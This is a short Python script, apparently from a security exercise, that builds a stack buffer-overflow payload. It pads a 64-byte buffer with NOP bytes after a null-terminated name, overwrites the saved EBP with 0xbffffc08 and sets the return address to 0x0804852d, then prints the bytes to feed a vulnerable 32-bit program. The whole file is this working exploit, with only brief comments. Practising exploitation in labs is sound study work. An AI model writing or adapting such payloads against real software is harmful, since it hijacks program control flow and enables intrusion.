#!/usr/bin/python

name =  "Jamie Floyd\x00" # 12 bytes
buf = "\x90"*(64-12) # fills the rest of 64 byte buffer
buf2 = "\x90"*12 # fill up space to epb
ebp = "\x08\xfc\xff\xbf" #saved ebp is 0xbffffc08
attack = "\x2d\x85\x04\x08" # address I want to ret to: 804852d
print name+buf+buf2+ebp+attack
